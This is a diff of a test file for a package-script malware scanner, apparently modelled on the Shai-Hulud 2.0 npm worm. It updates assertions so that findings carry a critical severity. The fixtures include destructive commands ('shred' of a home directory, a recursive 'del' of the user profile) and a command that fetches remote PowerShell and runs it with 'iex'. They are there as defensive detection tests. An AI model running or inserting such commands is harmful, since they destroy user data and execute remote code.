@@ -28,9 +28,14 @@ describe('Research Heuristics (Shai-Hulud 2.0)', () => {
           cleanup: 'shred -uvz -n 1 /home/user',
         },
       };
-      const warnings = analyzeScripts(pkg);
-      expect(warnings).toContain(
-        "Suspicious script detected in 'cleanup': Known Malware Signature Match",
+      const findings = analyzeScripts(pkg);
+      expect(findings).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            message: "Suspicious script detected in 'cleanup': Known Malware Signature Match",
+            severity: 'critical'
+          })
+        ])
       );
     });
 
@@ -40,9 +45,14 @@ describe('Research Heuristics (Shai-Hulud 2.0)', () => {
           cleanup: 'del /F /Q /S "%USERPROFILE%*"',
         },
       };
-      const warnings = analyzeScripts(pkg);
-      expect(warnings).toContain(
-        "Suspicious script detected in 'cleanup': Known Malware Signature Match",
+      const findings = analyzeScripts(pkg);
+      expect(findings).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            message: "Suspicious script detected in 'cleanup': Known Malware Signature Match",
+            severity: 'critical'
+          })
+        ])
       );
     });
 
@@ -52,9 +62,14 @@ describe('Research Heuristics (Shai-Hulud 2.0)', () => {
           install: 'irm bun.sh/install.ps1|iex',
         },
       };
-      const warnings = analyzeScripts(pkg);
-      expect(warnings).toContain(
-        "Suspicious script detected in 'install': Known Malware Signature Match",
+      const findings = analyzeScripts(pkg);
+      expect(findings).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            message: "Suspicious script detected in 'install': Known Malware Signature Match",
+            severity: 'critical'
+          })
+        ])
       );
     });
 
@@ -64,10 +79,15 @@ describe('Research Heuristics (Shai-Hulud 2.0)', () => {
           postinstall: 'echo "Sha1-Hulud: The Second Coming"',
         },
       };
-      const warnings = analyzeScripts(pkg);
+      const findings = analyzeScripts(pkg);
       // "The Second Coming" is in the signatures list
-      expect(warnings).toContain(
-        "Suspicious script detected in 'postinstall': Known Malware Signature Match",
+      expect(findings).toEqual(
+        expect.arrayContaining([
+          expect.objectContaining({
+            message: "Suspicious script detected in 'postinstall': Known Malware Signature Match",
+            severity: 'critical'
+          })
+        ])
       );
     });
   });
